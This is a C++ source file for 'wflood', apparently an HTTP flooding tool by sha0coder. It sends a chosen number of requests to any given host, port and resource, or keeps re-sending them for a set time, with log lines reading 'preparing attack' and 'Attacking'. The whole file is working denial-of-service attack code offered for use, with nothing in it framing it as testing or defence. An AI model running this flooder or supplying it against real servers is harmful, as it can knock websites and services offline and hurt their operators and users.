// compile with  g++ wflood.cpp httpcpp.cpp -o wflood -std=c++11 
// by sha0coder using the great lib httpcpp form https://github.com/amcewen/HttpClient


#include "httpcpp.h"
#include <iostream>
#include <unistd.h>
#include "Chrono.h"
#include "wflood.h"

using namespace std;

static float counter = -1;
Chrono chrono;
AsyncHttpClient *client;

class HttpResponseHndl : public HttpResponseHandler {
private:
    struct Target target;

public:

    void setTarget(struct Target t) {
        target = t;
    }

    void handle(HttpResponse* const response) {
        if (chrono.isRunning()) {
            cout << chrono.remain() << " [" << response->get_code() << "] ";
            HttpResponseHndl *resp = new HttpResponseHndl();
            resp->setTarget(target);
            client->fetch(target.host, target.port, target.meth, target.resource, target.data, resp);
            cout << "injected!" << endl;
        } else {
            cout << counter-- << " [" << response->get_code() << "] ";
        }

        cout << response->get_body().size() << " bytes" << endl;

        if (counter == 0 || chrono.end())
            exit(1);
    }
};


void usage() {
    cout << "USAGE: " << endl;
    cout << "  -h [host] " << endl;
    cout << "  -p [port] " << endl;
    cout << "  -m [method] " << endl;
    cout << "  -r [resource] " << endl;
    cout << "  -d [post data] " << endl;
    cout << "  -c [num of packets to send] " << endl;
    cout << "  -t [timeout] " << endl;
    cout << "  (use -c or -t but not both) " << endl;
    cout << "Ex:" << endl;
    cout << " ./wflood  -h 127.0.0.1 -p 80 -m GET -r / -c 10 " << endl;
    exit(1);
}

int main(int argc, char **argv) {
    struct Target target;


    int op, timeout=-1;
    while ((op = getopt(argc, argv, "h:p:m:r:c:d:t:")) != EOF) {
        switch(op) {
            case 'h': target.host = optarg; break;
            case 'p': target.port = atoi(optarg); break;
            case 'm': target.meth = optarg; break;
            case 'r': target.resource = optarg; break;
            case 'd': target.data = optarg; break;
            case 'c': counter = atoi(optarg); break;
            case 't': timeout = atoi(optarg); break;
            case '?': usage(); break;
            default:  usage(); break;
        }
    }

    if (target.host == NULL || target.meth == NULL || target.port == 0 || target.resource == NULL)
        usage();

    if (counter == -1 && timeout == -1)
        usage();

    cout << "preparing attack ..." << endl;
    client = new AsyncHttpClient();

    try {
        if (timeout > 0) {
            chrono.start(timeout);
            HttpResponseHndl *resp = new HttpResponseHndl();
            resp->setTarget(target);
            client->fetch(target.host, target.port, target.meth, target.resource, target.data, resp);

        } else {

            for (float i = 0; i < counter; i++)
                client->fetch(target.host, target.port, target.meth, target.resource, target.data,
                              new HttpResponseHndl);
        }

    } catch(runtime_error e) {
        cout << "Connection refused." << endl;
    }

    cout << "Attacking." << endl;
    IOLoop::instance()->start();
    delete client;
}
